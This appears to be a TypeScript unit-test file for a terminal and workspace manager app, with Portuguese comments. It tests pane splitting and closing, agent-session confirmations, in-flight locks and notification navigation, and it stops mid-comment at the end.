import type { LayoutNode, LayoutSnapshot, Notification, Pane, Session, Tab, Workspace } from '@bridge/shared';
import { describe, expect, it } from 'vitest';
import {
  adoptTabIntoPane,
  closePane,
  createSessionInPane,
  closeTabById,
  closeWorkspace,
  makeKeyHandlers,
  mergeWorkspace,
  newTabWithSession,
  openDiff,
  openWorkspaceFolder,
  removeWorktree,
  queuedMessage,
  reopenWithRecap,
  revealSession,
  setWorktreeBase,
} from '../src/actions.js';
import type { ActionDeps } from '../src/actions.js';
import { ApiError } from '../src/api.js';
import { recapFailureMessage, recapInput } from '../src/recap.js';
import { EMPTY_GROUP_PREFS, expandWorkspace, workspaceCollapsed } from '../src/sidebarPrefs.js';
import type { GroupPrefs } from '../src/sidebarPrefs.js';
import { emptyUiState, reduce } from '../src/state.js';
import type { UiAction, UiState } from '../src/state.js';


/**
 * O idioma destes testes. Ele e EXPLICITO em cada chamada de modelo desde a
 * Task 3 do lote de idioma: as assercoes abaixo descrevem o pt-BR, e um
 * default escondido faria a suite depender da maquina de quem a roda.
 */
const PT = 'pt-BR' as const;
// ------------------------------------------------------------- fixtures

function ws(id: string): Workspace {
  return { id, name: id, cwd: `C:\\projetos\\${id}`, createdAt: 1 };
}

/** Workspace de tarefa: mora num worktree e sabe qual é o base. */
function worktreeWs(id: string): Workspace {
  return {
    ...ws(id),
    cwd: `C:\\projetos\\repo\\.worktrees\\feat-x`,
    branch: 'feat-x',
    worktree: { base: 'main', path: 'C:\\projetos\\repo\\.worktrees\\feat-x' },
  };
}

function tab(id: string, workspaceId: string, order = 0): Tab {
  return { id, workspaceId, title: 'Terminal', kind: 'terminal', order };
}

function pane(id: string, tabId: string): Pane {
  return { id, tabId, cwd: 'C:\\projetos\\x' };
}

function session(overrides: Partial<Session> = {}): Session {
  return {
    id: 'sess-1',
    paneId: 'pane-1',
    workspaceId: 'ws-1',
    kind: 'shell',
    state: 'idle',
    startedAt: 1,
    stateSince: 1,
    consecutiveBlockedStops: 0,
    cwd: 'C:\\projetos\\x',
    ...overrides,
  };
}

function notification(overrides: Partial<Notification> = {}): Notification {
  return { id: 'n-1', sessionId: 'sess-1', workspaceId: 'ws-1', kind: 'done', text: 'Terminou', at: 10, ...overrides };
}

/** Um workspace, uma aba, `panes` painéis num split vertical à esquerda. */
function layoutWith(paneIds: string[], workspaces: Workspace[] = [ws('ws-1')]): LayoutSnapshot {
  const first = paneIds[0] ?? 'pane-1';
  let node: LayoutNode = { type: 'leaf', paneId: first };
  for (const id of paneIds.slice(1)) {
    node = { type: 'split', dir: 'v', ratio: 0.5, a: node, b: { type: 'leaf', paneId: id } };
  }
  return {
    repos: [],
    workspaces,
    tabs: [tab('tab-1', 'ws-1'), ...workspaces.slice(1).map((w, i) => tab(`tab-${w.id}`, w.id, i))],
    panes: paneIds.map((id) => pane(id, 'tab-1')),
    layouts: { 'tab-1': node },
  };
}

function stateFrom(layout: LayoutSnapshot, sessions: Session[] = []): UiState {
  return reduce(emptyUiState(), { type: 'hello', state: { layout, sessions, unread: [], git: {} } });
}

interface Call {
  path: string;
  method: string;
  body?: unknown;
}

type Responder = (path: string, method: string) => unknown;

interface Ctx {
  deps: ActionDeps;
  calls: Call[];
  actions: UiAction[];
  status: (string | undefined)[];
  /** Perguntas feitas ao usuário, na ordem — o texto importa nas confirmações de git. */
  confirms: string[];
  openedPaths: string[];
  /** O que o "Definir base…" perguntou, na ordem. */
  prompts: string[];
  dialogOpened: () => number;
  taskDialogOpened: () => number;
  settingsDialogOpened: () => number;
  windowFocused: () => number;
  /** Workspaces que a ação mandou ABRIR na sidebar, na ordem (0.12.2). */
  expanded: string[];
  /** A preferência local depois das aberturas — o que ficaria no `localStorage`. */
  prefs: () => GroupPrefs;
  /**
   * Troca o que `deps.latestState()` devolve. É como um teste simula o mundo
   * mudando ENTRE dois `await` de uma ação (o `session.started` que chega no
   * meio de um `closePane`); o `deps.state` continua sendo o snapshot.
   */
  setLatest: (next: UiState) => void;
}

/**
 * `deps` de mentira: `api` grava as chamadas e devolve o que o `responder`
 * mandar (um `Error` devolvido é lançado; uma `Promise` é aguardada, o que
 * permite segurar uma chamada em voo). `confirmAnswer` pode ser uma função
 * quando a ação pergunta mais de uma vez (merge que não é fast-forward).
 */
function makeCtx(
  state: UiState,
  responder: Responder = () => ({}),
  confirmAnswer: boolean | ((message: string) => boolean) = true,
  promptAnswer: string | null = null,
  collapsedWorkspaces: readonly string[] = [],
): Ctx {
  const calls: Call[] = [];
  const actions: UiAction[] = [];
  const status: (string | undefined)[] = [];
  const confirms: string[] = [];
  const openedPaths: string[] = [];
  const prompts: string[] = [];
  const expanded: string[] = [];
  // A preferência de verdade do App: o `expandWorkspaceRow` dele é este mesmo
  // `expandWorkspace` por cima do que estava gravado.
  let prefs: GroupPrefs = { ...EMPTY_GROUP_PREFS, collapsedWorkspaces: [...collapsedWorkspaces] };
  let opened = 0;
  let taskOpened = 0;
  let settingsOpened = 0;
  let usageOpened = 0;
  let focused = 0;

  let latest = state;
  const deps: ActionDeps = {
    state,
    lang: PT,
    latestState: () => latest,
    dispatch: (action) => actions.push(action),
    api: async (path, options = {}) => {
      calls.push({ path, method: options.method ?? 'GET', body: options.body });
      const result = await responder(path, options.method ?? 'GET');
      if (result instanceof Error) throw result;
      return result as never;
    },
    setStatus: (message) => status.push(message),
    openWorkspaceDialog: () => {
      opened += 1;
    },
    openTaskDialog: () => {
      taskOpened += 1;
    },
    openSettingsDialog: () => {
      settingsOpened += 1;
    },
    openUsagePanel: () => {
      usageOpened += 1;
    },
    inflight: new Set<string>(),
    confirm: (message) => {
      confirms.push(message);
      return typeof confirmAnswer === 'function' ? confirmAnswer(message) : confirmAnswer;
    },
    windowFocused: () => true,
    focusWindow: () => {
      focused += 1;
    },
    openPath: (p) => openedPaths.push(p),
    prompt: (m) => {
      prompts.push(m);
      return promptAnswer;
    },
    expandWorkspaceRow: (workspaceId) => {
      expanded.push(workspaceId);
      prefs = expandWorkspace(prefs, workspaceId);
    },
  };

  return {
    deps,
    calls,
    actions,
    status,
    confirms,
    openedPaths,
    prompts,
    expanded,
    prefs: () => prefs,
    setLatest: (next) => {
      latest = next;
    },
    dialogOpened: () => opened,
    taskDialogOpened: () => taskOpened,
    settingsDialogOpened: () => settingsOpened,
    windowFocused: () => focused,
  };
}

const tick = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));

// ------------------------------------------------------------------ specs

describe('pane.splitV', () => {
  it('divide o painel focado e foca o painel novo', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1']), [session()]), (path) =>
      path.includes('/split') ? { id: 'pane-2', tabId: 'tab-1', cwd: 'C:\\projetos\\x' } : {},
    );
    makeKeyHandlers(ctx.deps)['pane.splitV']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/panes/pane-1/split',
      'POST /api/focus',
    ]);
    expect(ctx.calls[0]?.body).toEqual({ dir: 'v' });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-2' });
  });

  it('sem painel nenhum avisa em vez de chamar a rota', async () => {
    const ctx = makeCtx(emptyUiState());
    makeKeyHandlers(ctx.deps)['pane.splitV']?.();
    await tick();
    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Nenhum painel pra dividir']);
  });

  it('erro do core vira linha de status', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), () => new Error('painel não encontrado'));
    makeKeyHandlers(ctx.deps)['pane.splitH']?.();
    await tick();
    expect(ctx.status).toEqual(['painel não encontrado']);
  });
});

describe('trava de ação em voo', () => {
  it('dois pane.splitV concorrentes viram uma chamada só', async () => {
    let release: (value: unknown) => void = () => undefined;
    const pending = new Promise((resolve) => {
      release = resolve;
    });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) => (path.includes('/split') ? pending : {}));
    const handlers = makeKeyHandlers(ctx.deps);

    handlers['pane.splitV']?.();
    handlers['pane.splitV']?.();
    handlers['pane.splitV']?.();
    expect(ctx.calls.filter((c) => c.path.includes('/split'))).toHaveLength(1);

    release({ id: 'pane-2' });
    await tick();
    await tick();

    // Com a primeira concluída, a trava soltou e uma nova vale.
    handlers['pane.splitV']?.();
    expect(ctx.calls.filter((c) => c.path.includes('/split'))).toHaveLength(2);
  });

  it('a trava é por ação: split não bloqueia navegação', async () => {
    let release: (value: unknown) => void = () => undefined;
    const pending = new Promise((resolve) => {
      release = resolve;
    });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path.includes('/split') ? pending : { paneId: null },
    );
    const handlers = makeKeyHandlers(ctx.deps);
    handlers['pane.splitV']?.();
    handlers['pane.right']?.();
    await tick();
    expect(ctx.calls.some((c) => c.path.includes('/neighbor'))).toBe(true);
    release({ id: 'pane-2' });
    await tick();
  });

  it('a trava solta mesmo quando a ação falha', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), () => new Error('boom'));
    const handlers = makeKeyHandlers(ctx.deps);
    handlers['pane.splitV']?.();
    await tick();
    handlers['pane.splitV']?.();
    expect(ctx.calls.filter((c) => c.path.includes('/split'))).toHaveLength(2);
  });
});

describe('agent.claude (R1)', () => {
  it('painel com sessão viva: divide antes e cria o agente no painel novo', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1']), [session({ state: 'running' })]), (path, method) => {
      if (path.includes('/split')) return { id: 'pane-2', tabId: 'tab-1', cwd: 'C:\\projetos\\x' };
      if (path === '/api/sessions' && method === 'POST') return session({ id: 'sess-2', paneId: 'pane-2', kind: 'agent', agent: 'claude' });
      return {};
    });
    makeKeyHandlers(ctx.deps)['agent.claude']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/panes/pane-1/split',
      'POST /api/sessions',
      'POST /api/focus',
    ]);
    expect(ctx.calls[1]?.body).toEqual({ paneId: 'pane-2', kind: 'agent', agent: 'claude' });
  });

  /**
   * 0.6.0 — o painel que voltou RETOMADO tem uma sessão de agente viva, e o
   * `Ctrl+Shift+C` nele continua dividindo (é o comportamento de sempre:
   * painel ocupado ganha vizinho). O "dois terminais" que o dono viu na 0.5.0
   * não vinha daqui — vinha do painel voltar como SHELL, com a dica pedindo
   * o atalho; agora ele volta como Claude e o atalho não é apertado. Este
   * teste trava o comportamento pra que um "conserto" futuro não passe a
   * criar um segundo Claude POR CIMA do que está vivo.
   */
  it('painel com AGENTE vivo (sessão retomada): divide, não substitui o Claude de pé', async () => {
    const live = session({ id: 'sess-retomada', kind: 'agent', agent: 'claude', state: 'running' });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1']), [live]), (path, method) => {
      if (path.includes('/split')) return { id: 'pane-2', tabId: 'tab-1', cwd: 'C:\\projetos\\x' };
      if (path === '/api/sessions' && method === 'POST') {
        return session({ id: 'sess-2', paneId: 'pane-2', kind: 'agent', agent: 'claude' });
      }
      return {};
    });
    makeKeyHandlers(ctx.deps)['agent.claude']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/panes/pane-1/split',
      'POST /api/sessions',
      'POST /api/focus',
    ]);
    // A sessão retomada segue no painel dela: o POST é pro painel NOVO.
    expect(ctx.calls[1]?.body).toEqual({ paneId: 'pane-2', kind: 'agent', agent: 'claude' });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-2' });
  });

  it('painel vazio: cria direto, sem dividir', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), () => session({ id: 'sess-2', kind: 'agent', agent: 'claude' }));
    makeKeyHandlers(ctx.deps)['agent.claude']?.();
    await tick();

    expect(ctx.calls.some((c) => c.path.includes('/split'))).toBe(false);
    expect(ctx.calls[0]).toMatchObject({ method: 'POST', path: '/api/sessions', body: { paneId: 'pane-1', kind: 'agent', agent: 'claude' } });
  });

  it('painel com sessão encerrada: cria direto (o core substitui)', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1']), [session({ state: 'exited' })]), () => session({ id: 'sess-2' }));
    makeKeyHandlers(ctx.deps)['agent.claude']?.();
    await tick();
    expect(ctx.calls.some((c) => c.path.includes('/split'))).toBe(false);
  });
});

describe('menu do workspace: "Novo Claude Code" / "Novo terminal"', () => {
  it('cria uma aba nova NO workspace do menu e sobe o Claude no painel dela', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'], [ws('ws-1'), ws('ws-2')])), (path, method) => {
      if (path === '/api/workspaces/ws-2/tabs') return { tab: tab('tab-n', 'ws-2', 1), pane: pane('pane-n', 'tab-n') };
      if (path === '/api/sessions' && method === 'POST') {
        return session({ id: 'sess-n', paneId: 'pane-n', kind: 'agent', agent: 'claude' });
      }
      return {};
    });
    await newTabWithSession(ctx.deps, 'ws-2', 'agent');

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'POST /api/workspaces/ws-2/tabs',
      'POST /api/sessions',
      'POST /api/focus',
    ]);
    expect(ctx.calls[0]?.body).toEqual({ kind: 'terminal' });
    expect(ctx.calls[1]?.body).toEqual({ paneId: 'pane-n', kind: 'agent', agent: 'claude' });
    // O menu pode ser de um workspace que NÃO está ativo: a aba nova tem que
    // aparecer na tela, então o workspace vira o ativo e a aba também.
    expect(ctx.actions).toContainEqual({ type: 'activateWorkspace', id: 'ws-2' });
    expect(ctx.actions).toContainEqual({ type: 'activateTab', workspaceId: 'ws-2', tabId: 'tab-n' });
  });

  it('"Novo terminal" sobe um shell na aba nova', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path, method) => {
      if (path === '/api/workspaces/ws-1/tabs') return { tab: tab('tab-n', 'ws-1', 1), pane: pane('pane-n', 'tab-n') };
      if (path === '/api/sessions' && method === 'POST') return session({ id: 'sess-n', paneId: 'pane-n', kind: 'shell' });
      return {};
    });
    await newTabWithSession(ctx.deps, 'ws-1', 'shell');
    expect(ctx.calls[1]).toMatchObject({ method: 'POST', path: '/api/sessions', body: { paneId: 'pane-n', kind: 'shell' } });
    // Já era o ativo: não dispara uma segunda ativação.
    expect(ctx.actions.filter((a) => a.type === 'activateWorkspace')).toEqual([]);
  });
});

describe('adoptTabIntoPane ("Trazer aba pro lado")', () => {
  it('manda o split com adoptTabId e mantém o foco no painel que chamou', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path) =>
      path.includes('/split') ? { tabId: 'tab-1', removedTabId: 'tab-2' } : {},
    );
    await adoptTabIntoPane(ctx.deps, 'pane-1', 'h', 'tab-2');
    expect(ctx.calls[0]).toEqual({ method: 'POST', path: '/api/panes/pane-1/split', body: { dir: 'h', adoptTabId: 'tab-2' } });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-1' });
  });
});

describe('tab.close', () => {
  const twoLive = (): UiState =>
    stateFrom(layoutWith(['pane-1', 'pane-2']), [
      session({ id: 'sess-1', paneId: 'pane-1' }),
      session({ id: 'sess-2', paneId: 'pane-2', state: 'running' }),
    ]);

  it('com sessão viva, confirma e chama só DELETE /api/tabs/:id — o core mata as sessões', async () => {
    const ctx = makeCtx(twoLive());
    makeKeyHandlers(ctx.deps)['tab.close']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-1']);
  });

  it('erro do core (ex.: falhou matar sessão) vira linha de status, sem chamada extra', async () => {
    const ctx = makeCtx(twoLive(), (path, method) =>
      method === 'DELETE' && path === '/api/tabs/tab-1' ? new Error('não consegui encerrar 1 sessão(ões)') : {},
    );
    makeKeyHandlers(ctx.deps)['tab.close']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-1']);
    expect(ctx.status).toEqual(['não consegui encerrar 1 sessão(ões)']);
  });

  it('cancelar a confirmação não mata nada', async () => {
    const ctx = makeCtx(twoLive(), () => ({}), false);
    makeKeyHandlers(ctx.deps)['tab.close']?.();
    await tick();
    expect(ctx.calls).toEqual([]);
  });

  it('aba sem sessão viva não pergunta nada', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1']), [session({ state: 'exited' })]));
    makeKeyHandlers(ctx.deps)['tab.close']?.();
    await tick();
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/tabs/tab-1']);
  });
});

describe('pane.close (Ctrl+Shift+X, ✕ do cabeçalho e botão do painel vazio)', () => {
  /** `neighbor?dir=right` responde `pane-2`; as outras direções, ninguém. */
  const neighborRight: Responder = (path) =>
    path.includes('/neighbor') ? { paneId: path.endsWith('dir=right') ? 'pane-2' : null } : {};

  it('painel vazio: pergunta o vizinho, apaga no core e leva o foco pra lá', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])), neighborRight);
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'GET /api/panes/pane-1/neighbor?dir=right',
      'DELETE /api/panes/pane-1',
      'POST /api/focus',
    ]);
    expect(ctx.confirms).toEqual([]);
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-2' });
  });

  it('shell vivo fecha direto, sem perguntar', async () => {
    const ctx = makeCtx(
      stateFrom(layoutWith(['pane-1', 'pane-2']), [session({ paneId: 'pane-1', state: 'running' })]),
      neighborRight,
    );
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  /**
   * 0.12.0 — a hospedeira. O `kind` dela é `'shell'`, mas tem um Claude Code
   * de verdade no meio de uma tarefa lá dentro, que é exatamente o que a
   * pergunta protege. O controle é o teste acima: shell SEM `hosted` continua
   * fechando direto.
   */
  it('shell hospedando um Claude pergunta antes, com o nome do agente', async () => {
    const hospedeira = session({
      paneId: 'pane-1',
      state: 'running',
      hosted: { agent: 'claude', since: 5000 },
    });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2']), [hospedeira]), neighborRight, true);
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toEqual(['Fechar este painel encerra a sessão claude. Continuar?']);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('e o "não" na hospedeira não chama rota nenhuma', async () => {
    const hospedeira = session({
      paneId: 'pane-1',
      state: 'needs-input',
      hosted: { agent: 'claude', since: 5000 },
    });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2']), [hospedeira]), neighborRight, false);
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls).toEqual([]);
  });

  /** Acabou a hospedagem (`hosted` sumiu): volta a ser um shell barato de reabrir. */
  it('shell que SAIU da hospedagem fecha direto de novo', async () => {
    const ctx = makeCtx(
      stateFrom(layoutWith(['pane-1', 'pane-2']), [session({ paneId: 'pane-1', state: 'idle', hosted: undefined })]),
      neighborRight,
    );
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('painel encerrado fecha direto: não há sessão viva pra perder', async () => {
    const ctx = makeCtx(
      stateFrom(layoutWith(['pane-1', 'pane-2']), [session({ paneId: 'pane-1', kind: 'agent', state: 'exited' })]),
      neighborRight,
    );
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('agente vivo pergunta antes, e o "não" não chama rota nenhuma', async () => {
    const state = stateFrom(layoutWith(['pane-1', 'pane-2']), [
      session({ paneId: 'pane-1', kind: 'agent', agent: 'claude', state: 'running' }),
    ]);
    const ctx = makeCtx(state, neighborRight, false);
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toEqual(['Fechar este painel encerra a sessão claude. Continuar?']);
    expect(ctx.calls).toEqual([]);
  });

  it('agente vivo com "sim" apaga o painel', async () => {
    const state = stateFrom(layoutWith(['pane-1', 'pane-2']), [
      session({ paneId: 'pane-1', kind: 'agent', agent: 'claude', state: 'needs-input' }),
    ]);
    const ctx = makeCtx(state, neighborRight, true);
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('último painel da aba: nem pergunta vizinho nem foca — o core fecha a aba junto', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])));
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual(['DELETE /api/panes/pane-1']);
  });

  it('sem vizinho em direção nenhuma, o foco cai no primeiro painel da aba', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])), (path) =>
      path.includes('/neighbor') ? { paneId: null } : {},
    );
    void closePane(ctx.deps, 'pane-2');
    await tick();

    expect(ctx.calls.filter((c) => c.path.includes('/neighbor'))).toHaveLength(4);
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-1' });
  });

  it('o ✕ fecha o painel do cabeçalho, não o focado', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])), (path) =>
      path.includes('/neighbor') ? { paneId: path.endsWith('dir=right') ? null : 'pane-1' } : {},
    );
    void closePane(ctx.deps, 'pane-2');
    await tick();

    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toEqual([
      'GET /api/panes/pane-2/neighbor?dir=right',
      'GET /api/panes/pane-2/neighbor?dir=left',
      'DELETE /api/panes/pane-2',
      'POST /api/focus',
    ]);
  });

  it('painel que já sumiu do estado não chama rota', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])));
    void closePane(ctx.deps, 'pane-fantasma');
    await tick();
    expect(ctx.calls).toEqual([]);
  });

  it('sem painel nenhum avisa em vez de chamar a rota', async () => {
    const ctx = makeCtx(emptyUiState());
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();
    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Nenhum painel pra fechar']);
  });

  // ------------------------------------------------ corridas com a criação
  //
  // O painel vazio com um `POST /api/sessions` em voo continua desenhado como
  // vazio: sem estas duas defesas, o "Fechar painel" (ou o ✕, ou o atalho)
  // apagaria em silêncio o agente que o usuário acabou de mandar subir.

  it('com sessão nascendo no painel, recusa em vez de fechar', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])));
    ctx.deps.inflight.add('pane.openClaude:pane-1');

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Aguarde a sessão abrir']);
  });

  it('vale também pro shell em voo (o Enter do painel vazio)', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])));
    ctx.deps.inflight.add('pane.openShell:pane-1');

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.calls).toEqual([]);
    expect(ctx.status).toEqual(['Aguarde a sessão abrir']);
  });

  it('agente que ficou vivo ENTRE a checagem e o DELETE ainda é perguntado', async () => {
    const agent = session({ paneId: 'pane-1', kind: 'agent', agent: 'claude', state: 'running' });
    let flip: (() => void) | undefined;
    // O painel está vazio no snapshot; o `session.started` "chega" durante a
    // consulta de vizinho, que é o que roda entre as duas checagens.
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])), (path) => {
      if (!path.includes('/neighbor')) return {};
      flip?.();
      return { paneId: path.endsWith('dir=right') ? 'pane-2' : null };
    });
    flip = () => ctx.setLatest(stateFrom(layoutWith(['pane-1', 'pane-2']), [agent]));

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.confirms).toEqual(['Fechar este painel encerra a sessão claude. Continuar?']);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('e o "não" nessa segunda pergunta não apaga nada', async () => {
    const agent = session({ paneId: 'pane-1', kind: 'agent', agent: 'claude', state: 'running' });
    let flip: (() => void) | undefined;
    const ctx = makeCtx(
      stateFrom(layoutWith(['pane-1', 'pane-2'])),
      (path) => {
        if (!path.includes('/neighbor')) return {};
        flip?.();
        return { paneId: path.endsWith('dir=right') ? 'pane-2' : null };
      },
      false,
    );
    flip = () => ctx.setLatest(stateFrom(layoutWith(['pane-1', 'pane-2']), [agent]));

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls.some((c) => c.method === 'DELETE')).toBe(false);
  });

  it('quem já respondeu "sim" não é perguntado duas vezes', async () => {
    const agent = session({ paneId: 'pane-1', kind: 'agent', agent: 'claude', state: 'running' });
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2']), [agent]), (path) =>
      path.includes('/neighbor') ? { paneId: path.endsWith('dir=right') ? 'pane-2' : null } : {},
    );
    ctx.setLatest(stateFrom(layoutWith(['pane-1', 'pane-2']), [agent]));

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.confirms).toHaveLength(1);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('shell que ficou vivo no meio do caminho fecha sem perguntar (é barato de reabrir)', async () => {
    let flip: (() => void) | undefined;
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2'])), (path) => {
      if (!path.includes('/neighbor')) return {};
      flip?.();
      return { paneId: path.endsWith('dir=right') ? 'pane-2' : null };
    });
    flip = () =>
      ctx.setLatest(stateFrom(layoutWith(['pane-1', 'pane-2']), [session({ paneId: 'pane-1', state: 'running' })]));

    void closePane(ctx.deps, 'pane-1');
    await tick();

    expect(ctx.confirms).toEqual([]);
    expect(ctx.calls.map((c) => `${c.method} ${c.path}`)).toContain('DELETE /api/panes/pane-1');
  });

  it('erro do core vira linha de status', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), (path, method) =>
      method === 'DELETE' ? new Error('painel não encontrado') : {},
    );
    makeKeyHandlers(ctx.deps)['pane.close']?.();
    await tick();
    expect(ctx.status).toEqual(['painel não encontrado']);
  });
});

describe('notifications.jump', () => {
  it('usa a não lida mais recente do core e leva até a sessão', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1', 'pane-2']), [session({ id: 'sess-2', paneId: 'pane-2' })]), (path) =>
      path.includes('latest-unread') ? notification({ sessionId: 'sess-2' }) : {},
    );
    makeKeyHandlers(ctx.deps)['notifications.jump']?.();
    await tick();

    expect(ctx.calls[0]?.path).toBe('/api/notifications/latest-unread');
    expect(ctx.actions).toContainEqual({ type: 'activateTab', workspaceId: 'ws-1', tabId: 'tab-1' });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-2' });
    expect(ctx.calls.at(-1)).toMatchObject({ method: 'POST', path: '/api/focus', body: { sessionId: 'sess-2', windowFocused: true } });
    expect(ctx.windowFocused()).toBe(1);
  });

  it('sem não lidas, avisa e não foca nada', async () => {
    const ctx = makeCtx(stateFrom(layoutWith(['pane-1'])), () => null);
    makeKeyHandlers(ctx.deps)['notifications.jump']?.();
    await tick();
    expect(ctx.status).toEqual(['Nenhuma notificação não lida']);
    expect(ctx.actions).toEqual([]);
  });
});

/**
 * `revealSession` é o alvo do clique no toast (nativo e web), do painel de
 * notificações e do `Ctrl+Shift+U`. Com mais de um workspace ele tem que
 * mudar os TRÊS: workspace, aba e painel — e não só o foco da sessão.
 */
describe('revealSession com mais de um workspace', () => {
  /** ws-1 (tab-1, pane-1) e ws-2 (tab-ws-2, pane-9) — a sessão alvo mora no ws-2. */
  function multi(): { state: UiState; alvo: Session } {
    const workspaces = [ws('ws-1'), ws('ws-2')];
    const layout = layoutWith(['pane-1'], workspaces);
    layout.panes = [...layout.panes, pane('pane-9', 'tab-ws-2')];
    layout.layouts = { ...layout.layouts, 'tab-ws-2': { type: 'leaf', paneId: 'pane-9' } };
    const alvo = session({ id: 'sess-9', paneId: 'pane-9', workspaceId: 'ws-2' });
    return { state: stateFrom(layout, [session(), alvo]), alvo };
  }

  it('ativa o workspace, a aba e o painel certos, e foca a janela', async () => {
    const { state } = multi();
    expect(state.activeWorkspaceId).toBe('ws-1');
    const ctx = makeCtx(state);

    await revealSession(ctx.deps, 'sess-9');

    // `activateTab` carrega o workspace junto (o reducer troca os dois).
    expect(ctx.actions).toContainEqual({ type: 'activateTab', workspaceId: 'ws-2', tabId: 'tab-ws-2' });
    expect(ctx.actions).toContainEqual({ type: 'focusPane', paneId: 'pane-9' });
    expect(ctx.calls).toEqual([
      { path: '/api/focus', method: 'POST', body: { sessionId: 'sess-9', windowFocused: true } },
    ]);
    expect(ctx.windowFocused()).toBe(1);

    // E o reducer, com essas ações, leva o estado pro workspace certo.
    const depois = ctx.actions.reduce(reduce, state);
    expect(depois.activeWorkspaceId).toBe('ws-2');
    expect(depois.activeTabByWorkspace['ws-2']).toBe('tab-ws-2');
    expect(depois.focusedPaneId).toBe('pane-9');
    expect(depois.focusedSessionId).toBe('sess-9');
  });

  /**
   * 0.12.2 — recolher é preferência de leitura ("não quero ver estas sessões
